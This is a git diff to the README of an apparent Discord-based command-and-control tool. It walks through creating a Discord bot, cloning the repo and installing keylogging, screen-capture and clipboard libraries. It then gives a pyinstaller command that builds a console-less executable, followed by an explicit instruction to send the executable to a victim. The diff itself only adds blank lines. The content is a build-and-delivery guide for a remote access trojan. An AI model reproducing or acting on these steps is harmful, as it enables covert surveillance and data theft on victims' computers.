@@ -31,6 +31,7 @@ Step3 Create new bot:
 <img width="1060" height="687" alt="Screenshot 2026-05-08 150332" src="https://github.com/user-attachments/assets/32b51349-5861-40dc-8305-a3f16a0354d7" />
 
 Step4 click your bot:
+
 <img width="1906" height="817" alt="Screenshot 2026-05-08 150509" src="https://github.com/user-attachments/assets/2eeb7ea4-e6fc-4d25-9258-38723e8b1914" />
 
 <img width="1909" height="823" alt="Screenshot 2026-05-08 150718" src="https://github.com/user-attachments/assets/b332bf95-98a8-41be-86f7-ecae142d4c7b" />
@@ -52,6 +53,7 @@ Step4 click your bot:
 <img width="404" height="278" alt="Screenshot 2026-05-08 151826" src="https://github.com/user-attachments/assets/5838bd57-fc04-4e7f-a007-a44f4a9dd2c0" />
 
 Step5 Download Discord app and login:
+
 <img width="1912" height="1000" alt="Screenshot 2026-05-08 151938" src="https://github.com/user-attachments/assets/0b0ac23b-ca6e-47a7-9d63-bfecfe6ac06d" />
 
 <img width="1918" height="1006" alt="Screenshot 2026-05-08 152139" src="https://github.com/user-attachments/assets/a4f2674a-6bda-45f8-ae3b-64342311f45f" />
@@ -60,9 +62,12 @@ Step5 Download Discord app and login:
 1- Clone the repo:
 `git clone https://github.com/huzaifa818/Discord-c2.git `
 
-#Install dependencies: 
+#Install dependencies:
+
 **Using Window 10/11 to make exe:**
+
 #Install Requirement:
+
 1- Install python latest and set in Environment variable
 
  `pip install discord.py pyautogui pynput pyperclip psutil pillow opencv-python`
@@ -70,6 +75,7 @@ Step5 Download Discord app and login:
 3- Command
 
 `pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py`
+
 -----------------------------After formed exe send it to victum---------------------------
 # CONFIG THESE IN discord_c2.py 
 
